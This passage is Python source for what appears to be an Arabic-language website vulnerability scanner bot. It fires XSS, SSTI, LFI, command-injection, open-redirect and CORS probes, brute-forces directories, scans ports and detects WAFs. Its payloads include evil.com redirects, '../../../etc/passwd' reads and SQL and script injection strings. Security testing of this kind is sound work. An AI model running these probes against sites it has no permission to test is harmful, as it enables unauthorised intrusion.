                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        async with session.get(test_url, allow_redirects=True) as response:
                            content = await response.text()
                            
                            if payload in content:
                                vulnerabilities.append(Vulnerability(
                                    vuln_type=f"XSS ({xss_type})",
                                    severity=Severity.HIGH if xss_type == 'reflected' else Severity.MEDIUM,
                                    param=param,
                                    payload=payload,
                                    evidence=f"Payload reflected in response ({technique})",
                                    url=test_url,
                                    recommendation="استخدم HTML Encoding و CSP"
                                ))
                            
                            if xss_type == 'ssti':
                                if '49' in content and '{{7*7}}' in payload:
                                    vulnerabilities.append(Vulnerability(
                                        vuln_type="SSTI (Template Injection)",
                                        severity=Severity.CRITICAL,
                                        param=param,
                                        payload=payload,
                                        evidence="Template expression evaluated: 49",
                                        url=test_url,
                                        recommendation="لا تمرر مدخلات المستخدم للـ Template Engine"
                                    ))
                    except:
                        continue
        
        text += f"📊 *تم اختبار:* {tested} payload\n\n"
        
        if vulnerabilities:
            text += f"🔴 *تم اكتشاف {len(vulnerabilities)} ثغرة!*\n\n"
            
            seen = set()
            for vuln in vulnerabilities:
                key = (vuln.param, vuln.vuln_type)
                if key not in seen:
                    seen.add(key)
                    text += f"┌ {vuln.severity.value}\n"
                    text += f"├ *Type:* {vuln.vuln_type}\n"
                    text += f"├ *Parameter:* `{vuln.param}`\n"
                    text += f"├ *Payload:* `{vuln.payload[:40]}...`\n"
                    text += f"└ *Evidence:* {vuln.evidence}\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💡 *التوصيات:*\n"
            text += "• استخدم HTML Encoding للمخرجات\n"
            text += "• طبّق Content Security Policy (CSP)\n"
            text += "• استخدم HttpOnly و Secure cookies\n"
            text += "• فلتر المدخلات الخطيرة\n"
        else:
            text += "✅ *لم يتم اكتشاف ثغرات XSS واضحة*\n\n"
            text += "💡 قد تكون هناك ثغرات DOM-based غير مكتشفة."
        
        return text
        
    except asyncio.TimeoutError:
        return text + "\n❌ انتهت مهلة الاتصال"
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def lfi_scan(url: str) -> str:
    """فحص متقدم لـ LFI مع PHP Wrappers"""
    url = normalize_url(url)
    
    text = "📁 *فحص LFI/RFI المتقدم*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    vulnerabilities = []
    tested = 0
    
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            test_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'folder', 'root', 'pg', 'style', 'template', 'php_path', 'lang', 'language', 'dir', 'action', 'module', 'content', 'layout', 'view']
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        else:
            test_params = list(params.keys())
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        async with await get_session() as session:
            for param in test_params[:8]:
                for payload, technique, os_type in LFI_PAYLOADS_ADVANCED[:20]:
                    tested += 1
                    
                    if params:
                        new_params = params.copy()
                        new_params[param] = [payload]
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = f"{base_url}?{query}"
                    else:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        async with session.get(test_url, allow_redirects=True) as response:
                            content = await response.text()
                            
                            for pattern, pattern_name in LFI_SUCCESS_PATTERNS:
                                if re.search(pattern, content, re.IGNORECASE):
                                    severity = Severity.CRITICAL if 'passwd' in pattern.lower() or 'php' in pattern.lower() else Severity.HIGH
                                    vulnerabilities.append(Vulnerability(
                                        vuln_type=f"LFI ({os_type})",
                                        severity=severity,
                                        param=param,
                                        payload=payload,
                                        evidence=f"Pattern matched: {pattern_name}",
                                        url=test_url,
                                        recommendation="لا تستخدم مدخلات المستخدم في include"
                                    ))
                                    break
                    except:
                        continue
        
        text += f"📊 *تم اختبار:* {tested} payload\n\n"
        
        if vulnerabilities:
            text += f"🔴 *تم اكتشاف {len(vulnerabilities)} ثغرة LFI!*\n\n"
            
            seen = set()
            for vuln in vulnerabilities:
                key = (vuln.param, vuln.payload[:20])
                if key not in seen:
                    seen.add(key)
                    text += f"┌ {vuln.severity.value}\n"
                    text += f"├ *Type:* {vuln.vuln_type}\n"
                    text += f"├ *Parameter:* `{vuln.param}`\n"
                    text += f"├ *Payload:* `{vuln.payload[:35]}...`\n"
                    text += f"└ *Evidence:* {vuln.evidence}\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💡 *التوصيات:*\n"
            text += "• لا تستخدم مدخلات المستخدم في include\n"
            text += "• استخدم whitelist للملفات المسموحة\n"
            text += "• عطّل allow_url_include و allow_url_fopen\n"
            text += "• استخدم open_basedir\n"
        else:
            text += "✅ *لم يتم اكتشاف ثغرات LFI*\n"
        
        return text
        
    except asyncio.TimeoutError:
        return text + "\n❌ انتهت مهلة الاتصال"
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def open_redirect_scan(url: str) -> str:
    """فحص Open Redirect"""
    url = normalize_url(url)
    
    text = "🔀 *فحص Open Redirect*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    vulnerabilities = []
    tested = 0
    
    redirect_payloads = [
        "//evil.com", "https://evil.com", "//evil.com/%2f..",
        "///evil.com", "////evil.com", "https:evil.com",
        "//evil%00.com", "/\\evil.com", "/%0d/evil.com",
        "/%2f%2fevil.com", "https://evil.com/..;/",
        "//google.com", "https://google.com",
        "//evil.com@legit.com", "//legit.com.evil.com",
    ]
    
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        redirect_params = ['url', 'redirect', 'return', 'next', 'redir', 'return_url', 'redirect_url', 'destination', 'dest', 'go', 'out', 'continue', 'target', 'link', 'returnTo', 'goto', 'forward', 'to', 'ref', 'callback']
        
        if not params:
            test_params = redirect_params
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        else:
            test_params = list(params.keys())
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        async with await get_session() as session:
            for param in test_params[:10]:
                for payload in redirect_payloads:
                    tested += 1
                    
                    if params:
                        new_params = params.copy()
                        new_params[param] = [payload]
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = f"{base_url}?{query}"
                    else:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        async with session.get(test_url, allow_redirects=False) as response:
                            if response.status in [301, 302, 303, 307, 308]:
                                location = response.headers.get('Location', '')
                                if any(x in location.lower() for x in ['evil.com', 'google.com']) or location.startswith('//'):
                                    vulnerabilities.append(Vulnerability(
                                        vuln_type="Open Redirect",
                                        severity=Severity.MEDIUM,
                                        param=param,
                                        payload=payload,
                                        evidence=f"Redirects to: {location[:50]}",
                                        url=test_url,
                                        recommendation="استخدم whitelist للـ domains المسموحة"
                                    ))
                    except:
                        continue
        
        text += f"📊 *تم اختبار:* {tested} payload\n\n"
        
        if vulnerabilities:
            text += f"🟠 *تم اكتشاف {len(vulnerabilities)} ثغرة Open Redirect!*\n\n"
            
            for vuln in vulnerabilities[:5]:
                text += f"┌ {vuln.severity.value}\n"
                text += f"├ *Parameter:* `{vuln.param}`\n"
                text += f"├ *Payload:* `{vuln.payload}`\n"
                text += f"└ *Evidence:* {vuln.evidence}\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💡 *التوصيات:*\n"
            text += "• استخدم whitelist للـ domains المسموحة\n"
            text += "• تحقق من الـ URL قبل التحويل\n"
            text += "• استخدم relative URLs فقط\n"
        else:
            text += "✅ *لم يتم اكتشاف ثغرات Open Redirect*\n"
        
        return text
        
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def command_injection_scan(url: str) -> str:
    """فحص متقدم لـ Command Injection"""
    url = normalize_url(url)
    
    text = "💻 *فحص Command Injection المتقدم*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    vulnerabilities = []
    tested = 0
    
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        cmd_params = ['cmd', 'exec', 'command', 'execute', 'ping', 'query', 'host', 'ip', 'arg', 'dir', 'domain', 'run', 'system', 'shell', 'process', 'daemon', 'upload', 'download', 'log', 'debug']
        
        if not params:
            test_params = cmd_params
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        else:
            test_params = list(params.keys())
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        async with await get_session() as session:
            for param in test_params[:6]:
                for payload, technique in CMD_INJECTION_PAYLOADS_ADVANCED[:20]:
                    tested += 1
                    
                    if params:
                        new_params = params.copy()
                        new_params[param] = [payload]
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = f"{base_url}?{query}"
                    else:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        if 'Time-Based' in technique or 'sleep' in payload.lower() or 'ping' in payload.lower():
                            start_time = time.time()
                            async with session.get(test_url, allow_redirects=True) as response:
                                await response.text()
                            elapsed = time.time() - start_time
                            
                            if elapsed >= 2.5:
                                vulnerabilities.append(Vulnerability(
                                    vuln_type="Command Injection (Time-Based)",
                                    severity=Severity.CRITICAL,
                                    param=param,
                                    payload=payload,
                                    evidence=f"Response delayed {elapsed:.1f}s",
                                    url=test_url,
                                    recommendation="لا تمرر مدخلات المستخدم للـ shell"
                                ))
                        else:
                            async with session.get(test_url, allow_redirects=True) as response:
                                content = await response.text()
                                
                                for pattern, pattern_name in CMD_SUCCESS_PATTERNS:
                                    if re.search(pattern, content):
                                        vulnerabilities.append(Vulnerability(
                                            vuln_type="Command Injection",
                                            severity=Severity.CRITICAL,
                                            param=param,
                                            payload=payload,
                                            evidence=f"Pattern matched: {pattern_name}",
                                            url=test_url,
                                            recommendation="لا تمرر مدخلات المستخدم للـ shell"
                                        ))
                                        break
                    except asyncio.TimeoutError:
                        if 'Time-Based' in technique:
                            vulnerabilities.append(Vulnerability(
                                vuln_type="Command Injection (Blind)",
                                severity=Severity.CRITICAL,
                                param=param,
                                payload=payload,
                                evidence="Request timeout - possible blind CMDi",
                                url=test_url,
                                recommendation="لا تمرر مدخلات المستخدم للـ shell"
                            ))
                    except:
                        continue
        
        text += f"📊 *تم اختبار:* {tested} payload\n\n"
        
        if vulnerabilities:
            text += f"🔴 *تم اكتشاف {len(vulnerabilities)} ثغرة Command Injection!*\n\n"
            
            for vuln in vulnerabilities[:5]:
                text += f"┌ {vuln.severity.value}\n"
                text += f"├ *Type:* {vuln.vuln_type}\n"
                text += f"├ *Parameter:* `{vuln.param}`\n"
                text += f"├ *Payload:* `{vuln.payload[:30]}...`\n"
                text += f"└ *Evidence:* {vuln.evidence}\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💡 *التوصيات:*\n"
            text += "• لا تستخدم system(), exec(), shell_exec()\n"
            text += "• استخدم escapeshellarg() و escapeshellcmd()\n"
            text += "• استخدم whitelist للأوامر المسموحة\n"
        else:
            text += "✅ *لم يتم اكتشاف ثغرات Command Injection*\n"
        
        return text
        
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def security_headers_scan(url: str) -> str:
    """فحص شامل لـ Security Headers"""
    url = normalize_url(url)
    
    text = "🛡️ *فحص Security Headers*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    missing_headers = []
    present_headers = []
    
    try:
        async with await get_session() as session:
            async with session.get(url, allow_redirects=True) as response:
                headers = dict(response.headers)
                
                for header, info in SECURITY_HEADERS.items():
                    header_lower = header.lower()
                    found = False
                    for h in headers:
                        if h.lower() == header_lower:
                            present_headers.append((header, headers[h], info))
                            found = True
                            break
                    if not found:
                        missing_headers.append((header, info))
                
                server = headers.get('Server', headers.get('server', ''))
                x_powered = headers.get('X-Powered-By', headers.get('x-powered-by', ''))
        
        text += "📋 *نتائج الفحص:*\n\n"
        
        if missing_headers:
            text += f"❌ *Headers مفقودة ({len(missing_headers)}):*\n\n"
            for header, info in missing_headers:
                text += f"┌ {info['severity'].value}\n"
                text += f"├ *Header:* `{header}`\n"
                text += f"├ *الوظيفة:* {info['desc']}\n"
                text += f"└ *التوصية:* {info['recommendation'][:50]}...\n\n"
        
        if present_headers:
            text += f"\n✅ *Headers موجودة ({len(present_headers)}):*\n"
            for header, value, info in present_headers:
                text += f"• `{header}`: ✓\n"
        
        if server:
            text += f"\n⚠️ *Server Header يكشف:* `{server}`\n"
            text += "   التوصية: أخفِ معلومات السيرفر\n"
        
        if x_powered:
            text += f"⚠️ *X-Powered-By يكشف:* `{x_powered}`\n"
            text += "   التوصية: احذف هذا الـ header\n"
        
        score = len(present_headers) / len(SECURITY_HEADERS) * 100
        text += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"📊 *درجة الأمان:* {score:.0f}%\n"
        
        if score >= 80:
            text += "🟢 ممتاز!\n"
        elif score >= 50:
            text += "🟡 متوسط - يحتاج تحسين\n"
        else:
            text += "🔴 ضعيف - يحتاج إصلاح فوري\n"
        
        return text
        
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def cors_scan(url: str) -> str:
    """فحص CORS Misconfiguration"""
    url = normalize_url(url)
    
    text = "🌐 *فحص CORS*\n\n"
    text += f"🎯 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    vulnerabilities = []
    
    test_origins = [
        'https://evil.com',
        'https://attacker.com',
        'null',
        'https://example.com.evil.com',
        f'{url}.evil.com',
    ]
    
    try:
        async with await get_session() as session:
            async with session.get(url) as response:
                default_acao = response.headers.get('Access-Control-Allow-Origin', '')
                default_acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            for origin in test_origins:
                headers = {'Origin': origin}
                async with session.get(url, headers=headers) as response:
                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')
                    
                    if acao == origin or acao == '*':
                        severity = Severity.HIGH if acac.lower() == 'true' else Severity.MEDIUM
                        vulnerabilities.append({
                            'origin': origin,
                            'acao': acao,
                            'acac': acac,
                            'severity': severity
                        })
        
        if default_acao == '*':
            text += "⚠️ *Wildcard Origin مفعّل*\n"
            text += "   يسمح لأي موقع بالوصول\n\n"
        
        if vulnerabilities:
            text += f"🔴 *تم اكتشاف {len(vulnerabilities)} مشكلة CORS!*\n\n"
            
            for vuln in vulnerabilities[:5]:
                text += f"┌ {vuln['severity'].value}\n"
                text += f"├ *Origin:* `{vuln['origin']}`\n"
                text += f"├ *ACAO:* `{vuln['acao']}`\n"
                text += f"└ *ACAC:* `{vuln['acac'] or 'false'}`\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💡 *التوصيات:*\n"
            text += "• استخدم whitelist للـ Origins المسموحة\n"
            text += "• لا تستخدم wildcard (*)\n"
            text += "• تحقق من الـ Origin قبل الإرجاع\n"
        else:
            text += "✅ *لم يتم اكتشاف مشاكل CORS*\n"
        
        return text
        
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def dir_bruteforce(url: str) -> str:
    """بحث عن مجلدات وملفات مخفية"""
    url = normalize_url(url)
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    text = "📂 *فحص المجلدات والملفات*\n\n"
    text += f"🌐 *الهدف:* `{base_url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    found_dirs = []
    found_files = []
    tested = 0
    
    all_paths = COMMON_DIRS[:60] + COMMON_FILES[:40]
    
    try:
        async with await get_session() as session:
            semaphore = asyncio.Semaphore(20)
            
            async def check_path(path):
                nonlocal tested
                async with semaphore:
                    tested += 1
                    test_url = f"{base_url}/{path}"
                    try:
                        async with session.get(test_url, allow_redirects=False) as response:
                            if response.status == 200:
                                content_length = response.headers.get('Content-Length', '?')
                                content_type = response.headers.get('Content-Type', '')[:30]
                                return (path, response.status, content_length, content_type)
                            elif response.status in [301, 302, 403]:
                                return (path, response.status, '-', 'redirect/forbidden')
                    except:
                        pass
                    return None
            
            tasks = [check_path(path) for path in all_paths]
            results = await asyncio.gather(*tasks)
            
            for result in results:
                if result:
                    path, status, size, ctype = result
                    if '.' in path:
                        found_files.append(result)
                    else:
                        found_dirs.append(result)
        
        text += f"📊 *تم فحص:* {tested} مسار\n\n"
        
        if found_dirs:
            text += f"📁 *مجلدات مكتشفة ({len(found_dirs)}):*\n"
            for path, status, size, ctype in found_dirs[:15]:
                status_icon = "✓" if status == 200 else "→" if status in [301, 302] else "🔒"
                text += f"  {status_icon} `/{path}` [{status}]\n"
            text += "\n"
        
        if found_files:
            text += f"📄 *ملفات مكتشفة ({len(found_files)}):*\n"
            for path, status, size, ctype in found_files[:15]:
                status_icon = "✓" if status == 200 else "→" if status in [301, 302] else "🔒"
                text += f"  {status_icon} `/{path}` [{status}] {size}B\n"
            text += "\n"
        
        critical_finds = [p for p, s, _, _ in (found_dirs + found_files) if any(x in p.lower() for x in ['.git', '.env', 'backup', 'config', 'admin', 'phpinfo', '.sql'])]
        if critical_finds:
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "⚠️ *ملفات حساسة مكتشفة!*\n"
            for path in critical_finds[:5]:
                text += f"  🔴 `/{path}`\n"
        
        if not found_dirs and not found_files:
            text += "✅ *لم يتم اكتشاف مجلدات أو ملفات مخفية*\n"
        
        return text
        
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def port_scan(host: str) -> str:
    """فحص المنافذ المفتوحة"""
    if host.startswith('http'):
        parsed = urllib.parse.urlparse(host)
        host = parsed.netloc
    
    host = host.split(':')[0]
    
    text = "🔌 *فحص المنافذ*\n\n"
    text += f"🎯 *الهدف:* `{host}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    common_ports = {
        21: 'FTP',
        22: 'SSH',
        23: 'Telnet',
        25: 'SMTP',
        53: 'DNS',
        80: 'HTTP',
        110: 'POP3',
        143: 'IMAP',
        443: 'HTTPS',
        445: 'SMB',
        993: 'IMAPS',
        995: 'POP3S',
        1433: 'MSSQL',
        1521: 'Oracle',
        3306: 'MySQL',
        3389: 'RDP',
        5432: 'PostgreSQL',
        5900: 'VNC',
        6379: 'Redis',
        8080: 'HTTP-Alt',
        8443: 'HTTPS-Alt',
        27017: 'MongoDB',
    }
    
    open_ports = []
    closed_ports = 0
    
    try:
        semaphore = asyncio.Semaphore(50)
        
        async def check_port(port):
            nonlocal closed_ports
            async with semaphore:
                try:
                    _, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port),
                        timeout=2
                    )
                    writer.close()
                    await writer.wait_closed()
                    return (port, common_ports.get(port, 'Unknown'))
                except:
                    closed_ports += 1
                    return None
        
        tasks = [check_port(port) for port in common_ports.keys()]
        results = await asyncio.gather(*tasks)
        
        for result in results:
            if result:
                open_ports.append(result)
        
        open_ports.sort(key=lambda x: x[0])
        
        text += f"📊 *تم فحص:* {len(common_ports)} منفذ\n\n"
        
        if open_ports:
            text += f"🟢 *منافذ مفتوحة ({len(open_ports)}):*\n\n"
            for port, service in open_ports:
                risk = "🔴" if port in [21, 23, 3389, 5900, 6379, 27017] else "🟡" if port in [22, 445, 3306, 5432] else "🟢"
                text += f"  {risk} *{port}* - {service}\n"
            
            risky_ports = [p for p, _ in open_ports if p in [21, 23, 3389, 5900, 6379, 27017, 445]]
            if risky_ports:
                text += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
                text += "⚠️ *منافذ خطيرة مفتوحة!*\n"
                text += "التوصية: أغلق المنافذ غير الضرورية\n"
        else:
            text += "✅ *لم يتم اكتشاف منافذ مفتوحة*\n"
            text += "(قد يكون هناك firewall يحظر الاتصالات)\n"
        
        return text
        
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def waf_detect(url: str) -> str:
    """اكتشاف WAF/IDS"""
    url = normalize_url(url)
    
    text = "🛡️ *اكتشاف WAF/IDS*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    detected_wafs = []
    
    try:
        async with await get_session() as session:
            async with session.get(url) as response:
                headers = dict(response.headers)
                cookies = str(response.cookies)
                
                for waf_id, signatures, waf_name in WAF_SIGNATURES:
                    for sig in signatures:
                        sig_lower = sig.lower()
                        headers_lower = str(headers).lower()
                        cookies_lower = cookies.lower()
                        
                        if sig_lower in headers_lower or sig_lower in cookies_lower:
                            if waf_name not in [w[0] for w in detected_wafs]:
                                detected_wafs.append((waf_name, sig))
                            break
            
            malicious_payloads = [
                "?id=1' OR '1'='1",
                "?q=<script>alert(1)</script>",
                "?file=../../../etc/passwd",
            ]
            
            for payload in malicious_payloads:
                test_url = url + payload
                try:
                    async with session.get(test_url) as response:
                        if response.status in [403, 406, 501, 503]:
                            if not detected_wafs:
                                detected_wafs.append(("Unknown WAF", f"Blocked with {response.status}"))
                            break
                except:
                    pass
        
        if detected_wafs:
            text += f"🔍 *تم اكتشاف {len(detected_wafs)} WAF:*\n\n"
            for waf_name, evidence in detected_wafs:
                text += f"┌ 🛡️ *{waf_name}*\n"
                text += f"└ Evidence: `{evidence}`\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💡 *معلومات:*\n"
            text += "• WAF يحمي من هجمات الويب الشائعة\n"
            text += "• قد يتطلب تقنيات bypass متقدمة\n"
            text += "• بعض WAFs يمكن تجاوزها بـ encoding\n"
        else:
            text += "⚠️ *لم يتم اكتشاف WAF*\n\n"
            text += "هذا يعني:\n"
            text += "• الموقع غير محمي بـ WAF\n"
            text += "• أو WAF مخفي/غير معروف\n"
        
        return text
        
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def check_sqli_quick(url: str) -> bool:
    """فحص سريع للـ SQL Injection"""
    try:
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        quick_payloads = ["'", "1' AND '1'='1", "1' AND SLEEP(2)--"]
        
        async with await get_session() as session:
            for payload in quick_payloads:
                test_url = f"{base_url}?id={urllib.parse.quote(payload)}"
                
                if 'SLEEP' in payload:
                    start = time.time()
                    try:
                        async with session.get(test_url, allow_redirects=True) as response:
                            await response.text()
                        if time.time() - start >= 1.5:
                            return True
                    except asyncio.TimeoutError:
                        return True
                else:
                    async with session.get(test_url, allow_redirects=True) as response:
                        content = await response.text()
                        for pattern, _ in SQL_ERROR_PATTERNS[:15]:
                            if re.search(pattern, content, re.IGNORECASE):
                                return True
        return False
    except:
        return False


async def check_xss_quick(url: str) -> bool:
    """فحص سريع للـ XSS"""
    try:
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        payload = "<script>alert(1)</script>"
        
        async with await get_session() as session:
            test_url = f"{base_url}?q={urllib.parse.quote(payload)}"
            async with session.get(test_url, allow_redirects=True) as response:
                content = await response.text()
                if payload in content:
                    return True
        return False
    except:
        return False


async def check_lfi_quick(url: str) -> bool:
    """فحص سريع للـ LFI"""
    try:
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        async with await get_session() as session:
            test_url = f"{base_url}?file=../../../etc/passwd"
            async with session.get(test_url, allow_redirects=True) as response:
                content = await response.text()
                if re.search(r"root:.*:0:0:", content):
                    return True
        return False
    except:
        return False


async def check_redirect_quick(url: str) -> bool:
    """فحص سريع للـ Open Redirect"""
    try:
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        async with await get_session() as session:
            test_url = f"{base_url}?url=//evil.com"
            async with session.get(test_url, allow_redirects=False) as response:
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location or location.startswith('//'):
                        return True
        return False
    except:
        return False


async def check_headers_quick(url: str) -> int:
    """فحص سريع للـ Security Headers - يرجع عدد المفقودة"""
    try:
        async with await get_session() as session:
            async with session.get(url, allow_redirects=True) as response:
                headers = dict(response.headers)
                missing = 0
                for header in SECURITY_HEADERS.keys():
                    found = False
                    for h in headers:
                        if h.lower() == header.lower():
                            found = True
                            break
                    if not found:
                        missing += 1
                return missing
    except:
        return 0


async def check_cors_quick(url: str) -> bool:
    """فحص سريع للـ CORS"""
    try:
        async with await get_session() as session:
            headers = {'Origin': 'https://evil.com'}
            async with session.get(url, headers=headers) as response:
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                if acao == 'https://evil.com' or acao == '*':
                    return True
        return False
    except:
        return False


async def full_scan(url: str) -> str:
    """فحص شامل واحترافي للموقع"""
    url = normalize_url(url)
    
    text = "🔥 *فحص شامل واحترافي*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += "⏳ جاري الفحص... قد يستغرق عدة دقائق\n\n"
    
    results = {
        'sql': False,
        'xss': False,
        'lfi': False,
        'redirect': False,
        'headers': 0,
        'cors': False,
        'technologies': [],
        'forms': 0,
        'endpoints': 0
    }
    
    try:
        spider_task = asyncio.create_task(spider_website(url, max_pages=15))
        
        vuln_tasks = [
            check_sqli_quick(url),
            check_xss_quick(url),
            check_lfi_quick(url),
            check_redirect_quick(url),
            check_headers_quick(url),
            check_cors_quick(url)
        ]
        
        scan_results = await asyncio.gather(*vuln_tasks, return_exceptions=True)
        
        results['sql'] = scan_results[0] if not isinstance(scan_results[0], Exception) else False
        results['xss'] = scan_results[1] if not isinstance(scan_results[1], Exception) else False
        results['lfi'] = scan_results[2] if not isinstance(scan_results[2], Exception) else False
        results['redirect'] = scan_results[3] if not isinstance(scan_results[3], Exception) else False
        results['headers'] = scan_results[4] if not isinstance(scan_results[4], Exception) else 0
        results['cors'] = scan_results[5] if not isinstance(scan_results[5], Exception) else False
        
        try:
            spider_results = await asyncio.wait_for(spider_task, timeout=30)
            results['technologies'] = spider_results.get('technologies', [])
            results['forms'] = len(spider_results.get('forms', []))
            results['endpoints'] = len(spider_results.get('endpoints', []))
        except:
            pass
        
        text = "🔥 *تقرير الفحص الشامل*\n\n"
        text += f"🌐 *الهدف:* `{url}`\n"
        text += f"📅 *التاريخ:* {time.strftime('%Y-%m-%d %H:%M')}\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        if results['technologies']:
            text += f"🔧 *التقنيات المكتشفة:*\n"
            for tech in results['technologies'][:8]:
                text += f"  • {tech}\n"
            text += "\n"
        
        text += f"📊 *معلومات الموقع:*\n"
        text += f"  • Forms: {results['forms']}\n"
        text += f"  • Endpoints: {results['endpoints']}\n\n"
        
        text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "📋 *نتائج فحص الثغرات:*\n\n"
        
        vuln_count = 0
        
        if results['sql']:
            text += "🔴 *SQL Injection:* معرض للخطر ⚠️\n"
            text += "   └ استخدم `/sqli` للتفاصيل\n"
            vuln_count += 1
        else:
            text += "✅ *SQL Injection:* لم يُكتشف\n"
        
        if results['xss']:
            text += "🔴 *XSS:* معرض للخطر ⚠️\n"
            text += "   └ استخدم `/xss` للتفاصيل\n"
            vuln_count += 1
        else:
            text += "✅ *XSS:* لم يُكتشف\n"
        
        if results['lfi']:
            text += "🔴 *LFI:* معرض للخطر ⚠️\n"
            text += "   └ استخدم `/lfi` للتفاصيل\n"
            vuln_count += 1
        else:
            text += "✅ *LFI:* لم يُكتشف\n"
        
        if results['redirect']:
            text += "🟠 *Open Redirect:* معرض للخطر ⚠️\n"
            text += "   └ استخدم `/redirect` للتفاصيل\n"
            vuln_count += 1
        else:
            text += "✅ *Open Redirect:* لم يُكتشف\n"
        
        if results['cors']:
            text += "🟠 *CORS:* مشكلة في الإعدادات ⚠️\n"
            text += "   └ استخدم `/cors` للتفاصيل\n"
            vuln_count += 1
        else:
            text += "✅ *CORS:* سليم\n"
        
        if results['headers'] > 3:
            text += f"🟡 *Security Headers:* {results['headers']} مفقود ⚠️\n"
            text += "   └ استخدم `/secheaders` للتفاصيل\n"
        else:
            text += f"✅ *Security Headers:* {7 - results['headers']}/7\n"
        
        text += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if vuln_count == 0:
            risk_level = "🟢 منخفض"
            text += f"📊 *مستوى الخطورة:* {risk_level}\n"
            text += "✅ الموقع يبدو آمناً!\n"
        elif vuln_count <= 2:
            risk_level = "🟡 متوسط"
            text += f"📊 *مستوى الخطورة:* {risk_level}\n"
            text += f"⚠️ تم اكتشاف {vuln_count} ثغرة محتملة\n"
        else:
            risk_level = "🔴 عالي"
            text += f"📊 *مستوى الخطورة:* {risk_level}\n"
            text += f"🚨 تم اكتشاف {vuln_count} ثغرات خطيرة!\n"
        
        text += "\n💡 *للفحص التفصيلي:*\n"
        text += "`/sqli`, `/xss`, `/lfi`, `/cmdi`\n"
        text += "`/secheaders`, `/cors`, `/dirscan`\n"
        
        return text
        
    except asyncio.TimeoutError:
        return text + "\n❌ انتهت مهلة الاتصال"
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"
